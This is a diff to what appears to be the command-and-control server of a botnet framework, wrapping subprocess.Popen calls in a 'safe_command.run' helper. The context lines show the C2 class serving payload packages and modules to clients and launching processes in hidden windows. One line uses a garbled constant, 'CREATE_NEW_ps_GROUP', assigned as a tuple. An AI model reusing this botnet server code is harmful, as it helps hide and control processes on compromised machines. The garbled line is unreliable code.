@@ -22,6 +22,7 @@ import threading
 import subprocess
 import collections
 from datetime import datetime
+from security import safe_command
 
 http_serv_mod = "SimpleHTTPServer"
 if sys.version_info[0] > 2:
@@ -105,11 +106,11 @@ class C2(threading.Thread):
         # don't run multiple instances
         try:
             # serve packages
-            globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = safe_command.run(subprocess.Popen, '{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
             util.log("Serving Python packages from {0} on port {1}...".format(globals()['packages'], self.port + 2))
 
             # serve modules
-            globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+            globals()['module_handler'] = safe_command.run(subprocess.Popen, '{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
             util.log("Serving BYOB modules from {0} on port {1}...".format(modules, self.port + 1))
 
             globals()['c2'] = self
@@ -137,11 +138,11 @@ class C2(threading.Thread):
                 info = subprocess.STARTUPINFO()
                 info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                 info.wShowWindow = subprocess.SW_HIDE
-                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+                self.child_procs[name] = safe_command.run(subprocess.Popen, args, startupinfo=info)
                 return "Running '{}' in a hidden process".format(path)
             except Exception as e:
                 try:
-                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    self.child_procs[name] = safe_command.run(subprocess.Popen, args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
                     util.log("{} error: {}".format(self._execute.__name__, str(e)))
@@ -269,7 +270,7 @@ class C2(threading.Thread):
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = safe_command.run(subprocess.Popen, '{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
     def run(self):
         """
